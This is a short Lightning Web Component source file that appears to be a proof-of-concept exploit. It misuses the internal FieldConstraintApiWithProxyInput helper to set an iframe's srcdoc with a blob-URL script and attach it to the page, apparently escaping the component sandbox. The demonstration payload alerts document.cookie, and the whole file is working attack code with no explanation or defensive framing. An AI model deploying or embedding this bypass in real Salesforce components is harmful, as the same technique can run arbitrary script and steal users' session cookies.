import { LightningElement } from "lwc"

import { FieldConstraintApiWithProxyInput } from "lightning/inputUtils"



class HelloWorld extends LightningElement {

payload = (function () {

const jsCode = "alert(document.cookie)"

const blob = new Blob([jsCode], { type: 'text/plain' });

const blobURL = URL.createObjectURL(blob);

return `<iframe srcdoc="<script src=${blobURL}></script>"></iframe>`

})();



connectedCallback() {
    alert(1);

var field = new FieldConstraintApiWithProxyInput({}, {}, "iframe")

field._setAttribute("srcdoc", this.payload)

document.body.appendChild(field._proxyInput)

}

}



export default HelloWorld;